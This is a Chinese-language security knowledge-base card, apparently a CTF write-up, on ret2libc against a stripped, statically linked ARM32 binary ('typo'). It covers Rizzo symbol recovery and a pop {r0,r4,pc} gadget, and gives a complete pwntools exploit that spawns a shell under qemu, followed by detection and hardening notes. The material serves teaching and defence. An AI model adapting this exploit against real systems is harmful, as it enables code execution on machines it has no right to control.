---
id: binary-pwn-rop-arm32-stripped-ret2libc-pop-r0-static
title: ARM32 静态去符号程序 ret2libc：用 Rizzo 恢复符号定位 system/bin/sh，再以 pop {r0,r4,pc} 供参跳转
type: scenario
domain: binary
path: binary/pwn/rop
technique: arm32-stripped-ret2libc-pop-r0-pop-r4-pc
tags:
- pwn
- arm
- arm32
- rop
- ret2libc
- stripped
- symbol-recovery
- rizzo
- qemu
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:34:41+08:00'
  notes: 已对照原文核对；本次核对未读取图片；Rizzo 签名恢复符号定位 system/bin/sh、pop {r0,r4,pc} 供参、偏移 112 与地址 0x20904/0x6c384/0x10BA8 均与正文贴出的 EXP 一致。未验证点：未运行 EXP，签名恢复效果与 gadget 来自未读截图
url: /docs/binary/pwn/rop/binary-pwn-rop-arm32-stripped-ret2libc-pop-r0-static/
draft: false
kb_aliases:
- ARM ret2libc
- arm32 ROP pop r0
- jarvisoj_typo
- Rizzo 恢复符号表
- arm 栈溢出 ret2system
- pop {r0, r4, pc}
---

## 一句话结论

ARM32 静态去符号程序栈溢出后要做等价 ret2libc，关键是两件事：先把 `system` 与 `/bin/sh` 的地址找回来（用 Rizzo 以对应版本 libc 的签名恢复符号，或从 `/bin/sh` 的交叉引用反查调用者），再用 `pop {r0, r4, pc}` 这类 gadget 把 `r0` 置为 `/bin/sh` 后跳 `system`——因为 ARM 用 `r0`–`r3` 传参，覆盖栈上的 `LR` 只解决跳转、不解决参数。

## 原理

- ARM32 的函数前四个参数放在 `r0`–`r3`，其余从右往左入栈，返回值在 `r0`；函数调用 `bl` 把返回地址写入 `LR`（`r14`）。栈溢出覆盖到保存的 `LR` 就能控制返回目标，但**参数仍需由寄存器提供**，所以必须有能写 `r0` 的 gadget。
- `pop {r0, r4, pc}` 是 ARM 上最常用的「供参 + 跳转」原语：出栈时依次复原 `r0`、`r4`，并直接把 `pc` 出栈，等于「设参后跳任意地址」，省掉单独的 `pop {pc}`。
- 静态链接去符号后没有 `system` 标签：Rizzo（FLIRT 思路的 IDA 插件）用同版本 libc 生成签名再在该程序上匹配，能批量恢复静态链接进来的库函数名；另一条路是搜 `/bin/sh` 字符串，看谁引用了它，引用点通常就在 `system` 内部或其调用链上。
- 需要 `libc6-*-cross` 提供与目标同版本、同架构的 libc 作为签名源；版本不匹配会导致匹配率骤降甚至错配，因此先由程序构建信息/字符串推断 libc 版本更稳妥。
- 偏移计算：例题缓冲区到保存 `LR` 的距离为 112（0x70），需按反汇编确认（函数序言 `push {..., lr}` 与 `sub sp, sp, #N` 共同决定）。

## 触发条件

- ARM32（`arm-32-little`）静态链接 ELF，去符号但在程序内静态链接了 libc（含 `system` 与 `/bin/sh`）。
- 存在栈溢出，覆盖长度足以到达保存的 `LR`，且无栈保护（或可绕过）。
- 程序内存在 `pop {r0, r4, pc}` 一类可控 `r0` 的 gadget。
- 有 `qemu-arm-static` 与 `gdb-multiarch`（或 IDA 远程调试）用于确认 `r0`/`pc` 与偏移。

## 利用步骤

1. `file ./typo` 确认 `ELF 32-bit LSB, ARM, statically linked, stripped`。
2. 用 IDA 打开对应架构/版本的 libc，`File → Produce file → Rizzo signature file` 生成签名；再在目标程序里 `File → Load file → Rizzo signature file` 恢复符号，得到 `system` 地址。
3. 备用定位：搜 `/bin/sh`，`Ctrl+X` 看引用，逐层进函数确认 `system` 实现位置。
4. ROPgadget/ROPgadget-ARM 找 `pop {r0, r4, pc}`，记录地址。
5. 计算溢出偏移（本例 112），构造 `填充 + pop_r0_r4_pc + binsh + 0 + system`。
6. 用 `qemu-arm-static -g 1234 ./typo` + `gdb-multiarch -ex "set architecture arm"` 验证进入 `system` 时 `r0` 指向 `/bin/sh`。

## PoC

```python
from pwn import *
context(arch='arm', log_level='debug')
p = process(['qemu-arm-static', './typo'])

pop_r0_r4_ret = 0x00020904     # pop {r0, r4, pc}
binsh         = 0x0006c384     # 程序内 "/bin/sh" 字符串
system        = 0x00010BA8     # Rizzo 恢复得到的 system

p.send('\n')
payload  = b'a' * 112
payload += p32(pop_r0_r4_ret)
payload += p32(binsh)          # -> r0
payload += p32(0)              # -> r4
payload += p32(system)         # pc
sleep(0.1)
p.sendline(payload)
p.interactive()
```

调试：

```text
$ qemu-arm-static -g 1234 ./typo
$ gdb-multiarch -q -ex "set architecture arm" ./typo
(gdb) target remote :1234
```

判定：`system` 入口处 `r0` 指向 `"/bin/sh"`，随后进入 shell。

## 变体与关联

- 变体：若无 `pop {r0, r4, pc}`，可用两段式组合 gadget（见关联卡）；也可用 `mov r0, r7; blx r3` 这类「从别的寄存器搬参数」的序列。
- 变体：动态链接时先泄 GOT（`puts`/`write`）算 libc 基址，再取 `system`/`/bin/sh` 偏移，无需 Rizzo。
- 关联：[[binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3]]（无直接控 `r0` gadget 时的两段式组合）。
- 关联：[[tools-ida-flirt-flair-custom-library-signature]]（FLIRT/FLAIR 的 .sig 生成流程，Rizzo 与之同源）。
- 关联：[[binary-pwn-rop-mips32-stack-frame-gadget-args]]（同为 RISC 架构的参数/返回地址约定差异）。

## 检测与防御

- 加固：PIE + ASLR 使静态地址不可用；栈保护阻断溢出。
- 加固：编译 `-fstack-protector-strong` 与 `-D_FORTIFY_SOURCE`；发布去符号的同时不要静态链接含 `system` 的 libc。
- 检测（分析侧）：ARM 程序里 `pop {r0, ..., pc}` 是首要排查的原语；栈上出现「gadget 地址 + 字符串地址 + system 地址」三连即典型 ROP。
- 检测（运行时）：`pc` 从栈出栈后直接落到库函数入口且 `r0` 指向字符串，属异常控制流。
